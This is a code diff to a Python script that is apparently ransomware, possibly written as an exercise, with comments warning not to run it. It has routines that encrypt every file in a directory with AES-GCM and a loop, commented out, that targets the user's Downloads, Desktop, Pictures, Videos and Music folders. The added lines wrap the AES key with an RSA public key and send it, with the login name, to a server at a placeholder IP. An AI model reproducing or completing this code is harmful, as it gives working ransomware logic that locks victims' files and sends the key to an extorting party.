@@ -6,6 +6,10 @@ from file import File
 #import rsa
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import os
+import base64
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.backends import default_backend
 
 
 
@@ -36,6 +40,25 @@ def decrypt_all_files_in_directory(path, AES_key):
     for file in all_files:
         file.decrypt_file(AES_key)
 
+
+def encrypt_aes_key(aes_key_bytes, public_key_pem):
+    public_key = serialization.load_pem_public_key(
+        public_key_pem,
+        backend=default_backend()
+    )
+
+    encrypted_aes_key = public_key.encrypt(
+        aes_key_bytes,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+
+    return base64.b64encode(encrypted_aes_key).decode('utf-8')
+
+
 def main():
     print("now starting main....")
     server_public_ip = "SERVER_PUBLIC_IP"
@@ -53,12 +76,21 @@ def main():
     path_additions = [
         "Downloads", "Desktop", "Pictures", "Videos", "Music"]
 
+
+    #do not execute the following code, very dangurous!!!
+    #לא להריץ את הקוד הבא!! מאוד מסוכן!!!
     # for folder in path_additions:
     #     path = base_path / folder
     #     try:
     #         encrypt_all_files_in_directory(path, AES_key_256)
     #     except Exception as e:
     #         print(f"Something went wrong with {path}: {e}")
+
+    username = os.getlogin()
+    AES_key_256 = encrypt_aes_key(AES_key_256, rsa_public_key)
+    combined_message = username.encode("utf-8") + b"||" + AES_key_256
+    server_sock.send(combined_message)
+    server_sock.close()
 
 
 # def test_encrpytion(path, key):
